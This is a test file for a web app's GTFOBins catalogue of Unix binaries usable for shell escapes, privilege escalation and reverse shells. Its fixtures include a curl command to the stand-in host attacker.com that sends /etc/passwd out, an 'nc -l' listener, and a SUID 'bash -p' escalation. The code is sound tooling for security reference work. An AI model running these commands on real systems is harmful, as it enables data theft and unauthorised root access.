import test from "node:test";
import assert from "node:assert/strict";
import { readdirSync } from "node:fs";
import {
    entries,
    functionInfo,
    contextInfo,
    FUNCTION_ORDER,
    getEntry,
    resolveEntry,
    functionsOf,
    examplesFor,
    exampleCode,
    exampleNotes,
    exampleComments,
    attackerSide,
    searchEntries,
    substitute,
    DEFAULT_VARIABLES,
} from "../../apps/web/lib/tools/gtfobins/index.ts";

const upstream = readdirSync(new URL("../../vendor/gtfobins/_gtfobins/", import.meta.url));

test("every vendored upstream entry is in the generated catalogue (run node scripts/gtfobins.mjs if not)", () => {
    assert.deepEqual(entries.map((e) => e.name), [...upstream].sort());
});

test("function order covers exactly the functions upstream defines", () => {
    assert.deepEqual([...FUNCTION_ORDER].sort(), functionInfo.map((f) => f.id).sort());
});

test("aliases resolve to a real entry that has functions", () => {
    const aliases = entries.filter((e) => e.alias);
    assert.ok(aliases.length > 0);
    for (const entry of aliases) {
        const target = resolveEntry(entry);
        assert.notEqual(target, entry);
        assert.ok(!target.alias, `${entry.name}: alias chain does not end at a real entry`);
        assert.ok(functionsOf(entry).length > 0, `${entry.name} -> ${entry.alias} has no functions`);
    }
});

test("every example has code and only known contexts", () => {
    const known = new Set(contextInfo.map((c) => c.id));
    for (const entry of entries) {
        for (const examples of Object.values(entry.functions)) {
            for (const example of examples) {
                assert.ok(example.code.length > 0, entry.name);
                for (const ctx of Object.keys(example.contexts)) assert.ok(known.has(ctx), `${entry.name}: ${ctx}`);
            }
        }
    }
});

test("YAML anchors in the function definitions resolve to shared notes", () => {
    const shell = functionInfo.find((f) => f.id === "shell");
    const reverse = functionInfo.find((f) => f.id === "reverse-shell");
    assert.match(shell.extra.tty.false, /dummy REPL/);
    assert.deepEqual(reverse.extra.tty, shell.extra.tty);
    assert.ok(reverse.extra.listener["tcp-server"].code.startsWith("nc -l"));
});

test("search ranks exact, then prefix, then substring matches", () => {
    const names = searchEntries({ query: "tar" }).map((e) => e.name);
    assert.equal(names[0], "tar");
    const firstSubstring = names.findIndex((n) => !n.startsWith("tar"));
    assert.ok(firstSubstring === -1 || names.slice(0, firstSubstring).every((n) => n.startsWith("tar")));
    assert.deepEqual(searchEntries({ query: "  TAR " }).map((e) => e.name), names, "trim + case-insensitive");
    assert.equal(searchEntries({ query: "no-such-binary-xyz" }).length, 0);
});

test("function and context filters keep only entries with a matching example", () => {
    const suidShells = searchEntries({ fn: "shell", context: "suid" });
    assert.ok(suidShells.length > 0 && suidShells.length < entries.length);
    for (const entry of suidShells) assert.ok(examplesFor(entry, "shell", "suid").length > 0, entry.name);
    const caps = searchEntries({ context: "capabilities" });
    assert.ok(caps.length > 0 && caps.every((e) => functionsOf(e).some((fn) => examplesFor(e, fn, "capabilities").length)));
});

test("alias entries are found through their target's functions", () => {
    const alias = entries.find((e) => e.alias);
    const targetFns = functionsOf(getEntry(alias.alias));
    assert.deepEqual(functionsOf(alias), targetFns);
    assert.ok(searchEntries({ fn: targetFns[0] }).some((e) => e.name === alias.name));
});

test("a SUID example uses its context-specific code", () => {
    const bash = getEntry("bash");
    const [example] = examplesFor(bash, "shell", "suid");
    assert.equal(exampleCode(example, "suid"), example.contexts.suid.code ?? example.code);
    const withOverride = examplesFor(bash, "file-write", "suid").find((e) => e.contexts.suid.code);
    assert.ok(withOverride, "bash has a SUID-specific variant");
    assert.match(exampleCode(withOverride, "suid"), /bash -p/);
    assert.doesNotMatch(exampleCode(withOverride, "sudo"), /bash -p/, "other contexts keep the base code");
});

test("notes explain flags, SUID shell handling and capabilities", () => {
    const [tarShell] = examplesFor(getEntry("tar"), "shell", "suid");
    assert.ok(exampleNotes("shell", tarShell, "suid").some((n) => /system shell/.test(n)));
    const capExample = entries
        .flatMap((e) => Object.entries(e.functions).flatMap(([fn, list]) => list.map((example) => ({ fn, example }))))
        .find(({ example }) => example.contexts.capabilities?.list);
    assert.ok(exampleNotes(capExample.fn, capExample.example, "capabilities").some((n) => /CAP_/.test(n)));
    assert.deepEqual(exampleNotes("file-read", { code: "x", contexts: {} }), []);
});

test("comments include the context's own comment", () => {
    const withContextComment = entries
        .flatMap((e) => Object.values(e.functions).flat())
        .find((example) => Object.values(example.contexts).some((d) => d.comment));
    const ctx = Object.keys(withContextComment.contexts).find((c) => withContextComment.contexts[c].comment);
    assert.ok(exampleComments(withContextComment, ctx).includes(withContextComment.contexts[ctx].comment));
    assert.ok(!exampleComments(withContextComment).includes(withContextComment.contexts[ctx].comment));
});

test("reverse-shell examples point at an attacker-side listener", () => {
    const [example] = examplesFor(getEntry("bash"), "reverse-shell");
    const side = attackerSide("reverse-shell", example);
    assert.equal(side.kind, "listener");
    assert.ok(side.code);
    assert.equal(attackerSide("shell", { code: "x", contexts: {} }), undefined);
});

test("examples can carry their own attacker-side snippet instead of a shared id", () => {
    const [example] = examplesFor(getEntry("finger"), "upload");
    assert.equal(typeof example.receiver, "object");
    assert.equal(attackerSide("upload", example).code, example.receiver.code);
});

test("substitute swaps placeholders, and keeps them when a value is empty", () => {
    const code = "curl http://attacker.com:12345 -o /path/to/output-file </path/to/input-file";
    assert.equal(
        substitute(code, { attacker: "10.0.0.1", port: "8080", input: "/etc/passwd", output: "/tmp/o" }),
        "curl http://10.0.0.1:8080 -o /tmp/o </etc/passwd",
    );
    assert.equal(substitute(code, { attacker: "", port: "" }), code);
    assert.equal(substitute(code, DEFAULT_VARIABLES), code);
});
